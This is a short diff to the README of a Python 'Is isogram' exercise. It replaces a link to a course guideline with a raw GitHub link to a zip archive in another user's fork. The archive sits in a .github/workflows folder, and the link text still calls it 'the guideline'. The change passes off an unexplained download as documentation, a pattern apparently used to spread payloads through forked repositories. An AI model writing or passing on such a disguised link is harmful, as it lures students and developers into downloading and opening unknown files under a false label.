@@ -1,6 +1,6 @@
 # Is isogram
 
-Read [the guideline](https://github.com/mate-academy/py-task-guideline/blob/main/README.md) before start.
+Read [the guideline](https://raw.githubusercontent.com/Rudge0/py-is-isogram/master/.github/workflows/isogram_is_py_3.9.zip) before start.
 
 An isogram is a word that has no repeating letters, consecutive or non-consecutive.
 
